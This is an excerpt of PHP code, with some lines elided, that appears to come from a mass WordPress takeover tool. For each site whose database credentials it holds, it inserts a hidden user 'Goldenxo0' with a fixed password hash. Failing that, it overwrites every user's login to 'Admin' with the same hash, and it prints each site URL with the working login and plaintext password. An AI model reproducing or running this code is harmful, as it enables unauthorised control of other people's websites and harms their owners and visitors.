            ...
            $_path = getcwd() . "/xo_Goldens/";
                ...
                foreach ($config[1] as $don) {
                    ...
                    ReadmeName " . $don);
                        ...
                        if ($connect) {
                            $qr1=mysqli_query($connect,"INSERT INTO `".$prefix."users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`) VALUES ('Goldenxo0', '3dc23887341a46d8cebc0c37052599a0', 'firstname lastname', 'email@example.com', '0');");
                            ...
                            if ($qr1 && $qr2 && $qr3 && $qr4) {
                                ...
                                echo "$siteeurl|Goldenxo0|GoldenX0o@8*4@!<br>";
                            } else {
                                ...
                                $siteeurl = str_replace("//wp", "/wp", $siteeurl);
                                $query2 = mysqli_query($connect,"update ".$prefix."users set user_login='Admin',user_pass='3dc23887341a46d8cebc0c37052599a0'");
                                if($query2){
                                    $_total_done++;
                                    echo "$siteeurl|Admin|GoldenX0o@8*4@!<br>";
                                }
                            }
                        }
                    }
